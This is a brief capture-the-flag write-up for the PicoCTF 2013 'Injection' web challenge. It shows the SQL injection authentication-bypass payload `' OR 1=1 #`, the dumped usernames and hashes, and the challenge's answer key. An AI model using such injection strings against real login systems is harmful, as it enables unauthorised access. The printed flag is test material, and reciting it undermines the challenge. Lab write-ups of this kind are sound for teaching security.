# PicoCTF 2013: Injection

**Category:** Web Vuln
**Points:** 110
**Description:**

> Use the Loading Bay Control System to get the admin key! [Problem](https://2013.picoctf.com/problems/injection/)

## Write-up

The challenge is called "Injection" and it's a web based authentication page.  Chances are this is some kind of SQL Injection challenge, and we need to be able to bypass the authentication, as we don’t know a valid username.

Google for [sql-injection-authentication-bypass-cheat-sheet](https://pentestlab.wordpress.com/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)

Trying `' OR 1=1 #` and it's bug:

```
Username: user177 Hash: 53e33afe47d6951aa21b90741f11e711

Username: user178 Hash: 7efdd69b03fbb5cf805419bd1044f558

Username: admin Hash: bad_code_and_databases_is_no_fun
```

**Answer:** bad_code_and_databases_is_no_fun

## Other write-ups and resources

* none yet